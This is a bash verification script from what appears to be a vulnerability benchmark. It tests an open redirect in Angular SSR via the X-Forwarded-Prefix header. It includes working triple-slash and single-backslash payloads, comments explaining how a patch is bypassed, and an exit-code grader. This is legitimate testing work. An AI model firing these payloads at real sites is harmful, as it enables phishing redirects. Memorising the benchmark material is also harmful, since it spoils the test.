#!/usr/bin/env bash
# verify.sh --seed|--residual for PCBV2-0074 angular-ssr-cve-2026-33397
# (seed CVE-2026-27738 -> residual CVE-2026-33397; open redirect via X-Forwarded-Prefix, CWE-601)
#
# 机制: 服务端跑真实 @angular/ssr 的 AngularNodeAppEngine; GET /old 生成 Location =
#       joinUrlParts(X-Forwarded-Prefix, '/new') (open-redirect sink)。canary 为
#       redirect-canary: flag token 用作攻击者重定向 host 标签, 成功时出现在 Location 头。
#   seed    : X-Forwarded-Prefix = ///<flag>.evil.invalid (三斜杠)
#               v0 (20.3.16, joinUrlParts 只剥一个前导斜杠) -> Location //<flag>...  rc=0
#               v1 (20.3.17, INVALID_PREFIX_REGEX /^[/\\]{2}/) -> HTTP 400 无 Location rc=10
#   residual: X-Forwarded-Prefix = \<flag>.evil.invalid (单个前导反斜杠)
#               v1 (20.3.17, 正则需两个斜杠/反斜杠; joinUrlParts 只剥正斜杠)
#                   -> Location /\<flag>... (浏览器按 // 协议相对解析)               rc=0
#               v2 (20.3.21, 正则加 ^\\ 分支) -> HTTP 400                             rc=10
#
# flag 通道: INJECTION 类 —— compose entrypoint 仅 guard PCB_FLAG 已设置, app 不持有 flag;
#            验证者把 RUN_FLAG 嵌入 X-Forwarded-Prefix (payload), 成功重定向时 Location 回显。
# 判定基准: JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}" (真 flag 优先)。wrong/stale 检查时
#            嵌入 RUN_FLAG=override -> Location 含 override != 真 flag -> 判定失败 (10)。
# 退出码: 0=效果发生(flag 出现) 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}"
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# 动态解析该版本服务宿主端口 (compose 固定映射 38316/38317; 平台动态端口亦兼容)
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8080}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | head -n1 | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "${PORT:-}" ]] || { echo "verify: port resolve failed for $VERSION" >&2; exit 20; }
echo "verify: $VERSION host port = $PORT"

# readiness: 任意 HTTP 响应 (含 400/404/302) 即服务就绪; 连接失败返回 000
READY=""
for _ in $(seq 1 60); do
  CODE="$(curl -sS -m 3 -o /dev/null -w '%{http_code}' "http://127.0.0.1:$PORT/old" 2>/dev/null || true)"
  if [[ -n "$CODE" && "$CODE" != "000" ]]; then READY=1; break; fi
  sleep 2
done
if [[ -z "$READY" ]]; then echo "verify: service $VERSION not ready on port $PORT" >&2; exit 20; fi

# 构造 candidate: X-Forwarded-Prefix 嵌入 RUN_FLAG (提交值) 作为重定向 host 标签
"$PY" - "$MODE" "$RUN_FLAG" <<'PYEOF' > "$WORK_DIR/cand.json"
import json, sys
mode, flag = sys.argv[1], sys.argv[2]
if mode == "--seed":
    prefix = "///" + flag + ".evil.invalid"
    probe_id = "cve-2026-27738-triple-slash"
else:
    prefix = "\\" + flag + ".evil.invalid"   # 单个前导反斜杠 (CVE-2026-33397)
    probe_id = "cve-2026-33397-single-backslash"
cand = {"probe_id": probe_id, "method": "GET", "path": "/old",
        "headers": {"X-Forwarded-Prefix": prefix}}
print(json.dumps(cand))
PYEOF
echo "candidate: $(cat "$WORK_DIR/cand.json")"

# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
CASE_DIR="${CASE_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

# 公开执行器 seed_exec.py (curl -D - 取 Location); PCB_TARGET_BASE 覆盖 v1 base
OUT="$(PCB_TARGET_BASE="http://127.0.0.1:$PORT" "$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || {
  echo "$OUT" >&2; echo "verify: seed_exec failed" >&2; exit 20; }
echo "$OUT" | head -c 400; echo

# 判定: status 为空 (curl 失败/服务不可达) -> 20 环境失败;
#       Location 含 JUDGE_FLAG (真 flag 优先) -> 0, 否则 10
"$PY" - "$OUT" "$JUDGE_FLAG" <<'PYEOF'
import json, sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    print("BAD-JSON:", sys.argv[1][:200]); sys.exit(20)
flag = sys.argv[2]
print("version=%s status=%s" % (d.get("version"), d.get("status")))
location = str(d.get("location") or "")
print("location: %s" % location[:300])
if not str(d.get("status") or ""):
    sys.exit(20)
sys.exit(0 if flag in location else 10)
PYEOF
exit $?
